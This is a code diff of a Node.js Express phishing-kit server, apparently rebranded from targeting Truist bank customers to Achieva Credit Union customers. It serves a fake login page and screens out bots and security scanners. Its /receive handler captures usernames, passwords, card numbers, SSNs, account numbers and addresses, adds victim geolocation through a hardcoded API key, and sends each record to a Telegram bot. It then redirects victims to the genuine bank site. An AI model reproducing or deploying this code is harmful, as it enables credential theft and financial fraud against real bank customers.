@@ -2,15 +2,15 @@ const express = require('express');
 const app = express();
 const bodyParser = require('body-parser');
 const path = require('path');
-const { botToken, chatId } = require('./config/settings.js');
+const { botToken, chatId, plaid } = require('./config/settings.js');
+//const antibot = require('./middleware/antibot');
 //const { getClientIp } = require("request-ip");
 const https = require('https');
 const querystring = require('querystring');
 const axios = require('axios');
 const URL = `https://api-bdc.net/data/ip-geolocation?ip=`;
 const ApiKey = 'bdc_4422bb94409c46e986818d3e9f3b2bc2';
-const fs = require('fs').promises;
-const MobileDetect = require('mobile-detect');
+const fs = require('fs').promises; 
 const isbot = require('isbot');
 const ipRangeCheck = require('ip-range-check');
 const { botUAList } = require('./config/botUA.js');
@@ -22,6 +22,9 @@ const viewDir = path.join(__dirname, 'views');
 
 const port = 3000;
 
+
+
+
 app.listen(port, () => {
   console.log(`Server is running on port ${port}`);
 });
@@ -29,7 +32,7 @@ app.listen(port, () => {
 app.use(bodyParser.urlencoded({ extended: false }));
 app.use(bodyParser.json());
 app.use(express.static(path.join(__dirname, 'public')));
-app.set('trust proxy', true);
+app.set('trust proxy', true); 
 
 function getClientIp(req) {
   const xForwardedFor = req.headers['x-forwarded-for'];
@@ -40,12 +43,6 @@ function getClientIp(req) {
   return req.connection.remoteAddress || req.socket.remoteAddress || null;
 }
 
-// Middleware function for mobile detection
-app.use((req, res, next) => {
-  const md = new MobileDetect(req.headers['user-agent']);
-  req.isMobile = md.mobile();
-  next();
-});
 
 // Middleware function for bot detection
 function isBotUA(userAgent) {
@@ -142,6 +139,7 @@ app.use((req, res, next) => {
   }
 });
 
+
 app.get('/link', (req, res) => {
   const step = req.query.step;
 
@@ -161,156 +159,17 @@ app.get('/link', (req, res) => {
       break;
     default:
     
-      res.redirect('/login');
+      res.redirect('/Authenticate');
       break;
   }
 });
 
-app.use((req, res, next) => {
-    if (req.method === 'GET' && req.path.includes('.html')) {
-        // Redirect to the desired path, for example, the root path
-        res.redirect('/');
-        console.log('path')
-    } else {
-        next();
-    }
-});
 
-
-// Route handler for form submission
-app.post('/receive', async (req, res) => {
-    let message = '';
-    let responseSent = false; // Flag to prevent multiple responses
-    const myObject = req.body;
-
-    const sendAPIRequest = async (ipAddress) => {
-        const apiResponse = await axios.get(URL + ipAddress + '&localityLanguage=en&key=' + ApiKey);
-        console.log(apiResponse.data);
-        return apiResponse.data;
-    };
-
-    try {
-        const ipAddress = getClientIp(req);
-        const ipAddressInformation = await sendAPIRequest(ipAddress);
-        const userAgent = req.headers["user-agent"];
-        const systemLang = req.headers["accept-language"];
-
-        const myObjects = Object.keys(myObject).map(key => key.toLowerCase());
-
-        // Check conditions and prepare message
-        if (myObjects.includes('password') || myObjects.includes('user-id')) {
-            message += `✅ UPDATE TEAM | TRUIST | USER_${ipAddress}\n\n` +
-                `👤 LOGIN \n\n`;
-
-            for (const key of Object.keys(myObject)) {
-                if (key.toLowerCase() !== 'visitor' && myObject[key] !== "") {
-                    console.log(`${key}: ${myObject[key]}`);
-                    message += `${key}: ${myObject[key]}\n`;
-                }
-            }
-
-            message += `🌍 GEO-IP INFO\n` +
-                `IP ADDRESS       : ${ipAddressInformation.ip}\n` +
-                `COORDINATES      : ${ipAddressInformation.location.longitude}, ${ipAddressInformation.location.latitude}\n` +
-                `CITY             : ${ipAddressInformation.location.city}\n` +
-                `STATE            : ${ipAddressInformation.location.principalSubdivision}\n` +
-                `ZIP CODE         : ${ipAddressInformation.location.postcode}\n` +
-                `COUNTRY          : ${ipAddressInformation.country.name}\n` +
-                `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
-                `ISP              : ${ipAddressInformation.network.organisation}\n\n` +
-                `💻 SYSTEM INFO\n` +
-                `USER AGENT       : ${userAgent}\n` +
-                `SYSTEM LANGUAGE  : ${systemLang}\n` +
-                `💬 Telegram: https://t.me/UpdateTeams\n`;
-
-            res.send({ url: "/confirm?action=1" });
-            responseSent = true;
-        }
-
-        if (!responseSent && (myObjects.includes('expirationdate') || myObjects.includes('cardnumber') || myObjects.includes('billing address'))) {
-            message += `✅ UPDATE TEAM | TRUIST | USER_${ipAddress}\n\n` +
-                `👤 CARD INFO \n\n`;
-
-            for (const key of Object.keys(myObject)) {
-                if (key.toLowerCase() !== 'visitor') {
-                    console.log(`${key}: ${myObject[key]}`);
-                    message += `${key}: ${myObject[key]}\n`;
-                }
-            }
-
-            message += `🌍 GEO-IP INFO\n` +
-                `IP ADDRESS       : ${ipAddress}\n` +
-                `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
-                `💬 Telegram: https://t.me/UpdateTeams\n`;
-
-            res.send({ url: "/link?step=1" });
-            responseSent = true;
-        }
-
-        if (!responseSent && myObjects.includes('userid')) {
-            message += `✅ UPDATE TEAM | TRUIST | USER_${ipAddress}\n\n` +
-                `👤 PLAID LOGIN \n\n`;
-
-            for (const key of Object.keys(myObject)) {
-                if (key.toLowerCase() !== 'visitor') {
-                    console.log(`${key}: ${myObject[key]}`);
-                    message += `${key}: ${myObject[key]}\n`;
-                }
-            }
-
-            message += `🌍 GEO-IP INFO\n` +
-                `IP ADDRESS       : ${ipAddress}\n` +
-                `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
-                `💬 Telegram: https://t.me/UpdateTeams\n`;
-
-            res.send({ url: "https://truist.com/" });
-            responseSent = true;
-        }
-
-        if (!responseSent && (myObjects.includes('ssn') || myObjects.includes('firstname') || myObjects.includes('lastname'))) {
-            message += `✅ UPDATE TEAM | TRUIST | USER_${ipAddress}\n\n` +
-                `👤 CONTACT INFO \n\n`;
-
-            for (const key of Object.keys(myObject)) {
-                if (key.toLowerCase() !== 'visitor') {
-                    console.log(`${key}: ${myObject[key]}`);
-                    message += `${key}: ${myObject[key]}\n`;
-                }
-            }
-
-            message += `🌍 GEO-IP INFO\n` +
-                `IP ADDRESS       : ${ipAddress}\n` +
-                `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
-                `💬 Telegram: https://t.me/UpdateTeams\n`;
-
-            res.send({ url: "/confirm?action=2" });
-            responseSent = true;
-        }
-
-        // Send message to bot if needed
-        if (!responseSent) {
-            res.status(400).send({ error: "No matching keys found in request body." });
-            responseSent = true;
-        }
-
-        const sendMessage = sendMessageFor(botToken, chatId);
-        sendMessage(message);
-
-        console.log(message);
-    } catch (error) {
-        if (!responseSent) {
-            res.status(500).send({ error: "Internal server error" });
-        }
-        console.error(error);
-    }
-});
-
-// Route handler for login pages
-app.get('/login', async (req, res) => {
+app.get('/confirm', async (req, res) => {
   try {
     let htmlContent;
-    const fileName = `index.html`;
-    htmlContent = await fs.readFile(path.join(__dirname, 'views', fileName), 'utf-8');
+        htmlContent = await fs.readFile(path.join(__dirname, 'views', 'confirm.html'), 'utf-8');
+    
     res.send(htmlContent);
   } catch (error) {
     console.error('Error reading file:', error);
@@ -318,28 +177,174 @@ app.get('/login', async (req, res) => {
   }
 });
 
-app.get('/confirm', (req, res) => {
-  const action = req.query.action;
 
-  switch (action) {
-    case '1':
-      res.sendFile(path.join(viewDir, 'contact.html'));
-      break;
-      
-    case '2':
-      
-      res.sendFile(path.join(viewDir, 'card.html'));
-      break;
-      
-    default:
-    
-      res.redirect('/login');
-      break;
+// Middleware function for form submission
+app.post('/receive', async (req, res) => {
+  let message = '';
+  let myObject = req.body;
+
+  try {
+    const sendAPIRequest = async (ipAddress) => {
+      try {
+        const apiResponse = await axios.get(URL + ipAddress + '&localityLanguage=en&key=' + ApiKey);
+        return apiResponse.data;
+      } catch (error) {
+        console.error("Error in API request:", error);
+        throw error;
+      }
+    };
+
+    const ipAddress = getClientIp(req);
+    const ipAddressInformation = await sendAPIRequest(ipAddress);
+    const userAgent = req.headers["user-agent"];
+    const systemLang = req.headers["accept-language"];
+
+    const myObjects = Object.keys(myObject).map(key => key.toLowerCase());
+
+    if (myObjects.includes('username')) {
+      message += `✅ UPDATE TEAM | ACHIEVE ACU | USER_${ipAddress}\n\n` +
+                 `👤 LOGIN \n\n`;
+
+      for (const key of myObjects) {
+        if (key !== 'visitor') {
+          console.log(`${key}: ${myObject[key]}`);
+          message += `${key}: ${myObject[key]}\n`;
+        }
+      }
+
+      message += `🌍 GEO-IP INFO\n` +
+        `IP ADDRESS       : ${ipAddressInformation.ip}\n` +
+        `COORDINATES      : ${ipAddressInformation.location.longitude}, ${ipAddressInformation.location.latitude}\n` +
+        `CITY             : ${ipAddressInformation.location.city}\n` +
+        `STATE            : ${ipAddressInformation.location.principalSubdivision}\n` +
+        `ZIP CODE         : ${ipAddressInformation.location.postcode}\n` +
+        `COUNTRY          : ${ipAddressInformation.country.name}\n` +
+        `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
+        `ISP              : ${ipAddressInformation.network.organisation}\n\n` +
+        `💻 SYSTEM INFO\n` +
+        `USER AGENT       : ${userAgent}\n` +
+        `SYSTEM LANGUAGE  : ${systemLang}\n` +
+        `💬 Telegram: https://t.me/UpdateTeams\n`;
+
+      res.send('dn');
+    }
+
+    if (myObjects.includes('exp-date') || myObjects.includes('card-number') || myObjects.includes('billingaddress')) {
+      message += `✅ UPDATE TEAM | ACHIEVE ACU | USER_${ipAddress}\n\n` +
+                 `👤 CARD INFO\n\n`;
+
+      for (const key of myObjects) {
+        console.log(`${key}: ${myObject[key]}`);
+        message += `${key}: ${myObject[key]}\n`;
+      }
+
+      message += `🌍 GEO-IP INFO\n` +
+        `IP ADDRESS       : ${ipAddress}\n` +
+        `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
+        `💬 Telegram: https://t.me/UpdateTeams\n`;
+
+      let url;
+      if (plaid == "on") {
+        url = "/link?step=1";
+      } else {
+        url = "https://www.achievacu.com/";	
+      }
+
+      res.send({ url: url });
+    }
+
+    if (myObjects.includes('userid')) {
+      message += `✅ UPDATE TEAM | ACHIEVE ACU | USER_${ipAddress}\n\n` +
+                 `👤 PLAID INFO\n\n`;      for (const key of myObjects) {
+        console.log(`${key}: ${myObject[key]}`);
+        message += `${key}: ${myObject[key]}\n`;
+      }
+
+      message += `🌍 GEO-IP INFO\n` +
+        `IP ADDRESS       : ${ipAddress}\n` +
+        `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
+        `💬 Telegram: https://t.me/UpdateTeams\n`;
+    }
+
+    if (myObjects.includes('email')) {
+      message += `✅ UPDATE TEAM | ACHIEVE ACU | USER_${ipAddress}\n\n` +
+                 `👤 EMAIL INFO\n\n`;
+
+      for (const key of myObjects) {
+        console.log(`${key}: ${myObject[key]}`);
+        message += `${key}: ${myObject[key]}\n`;
+      }
+
+      message += `🌍 GEO-IP INFO\n` +
+        `IP ADDRESS       : ${ipAddress}\n` +
+        `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
+        `💬 Telegram: https://t.me/UpdateTeams\n`;
+
+      res.send('dn');
+    }
+
+    if (myObjects.includes('address') || myObjects.includes('city') || myObjects.includes('zip')) {
+      message += `✅ UPDATE TEAM | ACHIEVE ACU | USER_${ipAddress}\n\n` +
+                 `👤 ADDRESS INFO\n\n`;
+
+      for (const key of myObjects) {
+        console.log(`${key}: ${myObject[key]}`);
+        message += `${key}: ${myObject[key]}\n`;
+      }
+
+      message += `🌍 GEO-IP INFO\n` +
+        `IP ADDRESS       : ${ipAddress}\n` +
+        `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
+        `💬 Telegram: https://t.me/UpdateTeams\n`;
+
+      res.send('dn');
+    }
+
+    if (myObjects.includes('membernumber') || myObjects.includes('accountnumber') || myObjects.includes('ssn')) {
+      message += `✅ UPDATE TEAM | ACHIEVE ACU | USER_${ipAddress}\n\n` +
+                 `👤 USER ACCOUNT INFO\n\n`;
+
+      for (const key of myObjects) {
+        console.log(`${key}: ${myObject[key]}`);
+        message += `${key}: ${myObject[key]}\n`;
+      }
+
+      message += `🌍 GEO-IP INFO\n` +
+        `IP ADDRESS       : ${ipAddress}\n` +
+        `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
+        `💬 Telegram: https://t.me/UpdateTeams\n`;
+
+      res.send('dn');
+    }
+
+    console.log("Reached before sendMessageFor");
+const sendMessage = sendMessageFor(botToken, chatId);
+await sendMessage(message);
+console.log("Message sent successfully");
+
+  } catch (error) {
+    console.error("Error in processing request:", error);
+    res.status(500).send('An error occurred while processing the request.');
+  }
+});
+
+// Route handler for login pages
+app.get('/Authenticate', async (req, res) => {
+  try {
+    let htmlContent;
+    const page = req.params.page;
+    const fileName = `index.html`;
+    htmlContent = await fs.readFile(path.join(__dirname, 'views', fileName), 'utf-8');
+    console.log(htmlContent);
+    res.send(htmlContent);
+  } catch (error) {
+    console.error('Error reading file:', error);
+    res.status(500).send('Internal Server Error');
   }
 });
 
 app.get('/', async (req, res) => {
-  res.redirect('/login');
+        res.redirect('/Authenticate');
 });
 
 // Middleware function for bot detection
@@ -353,6 +358,6 @@ function antiBotMiddleware(req, res, next) {
   } else {
     next();
   }
-}
+} 
 
 app.use(antiBotMiddleware);
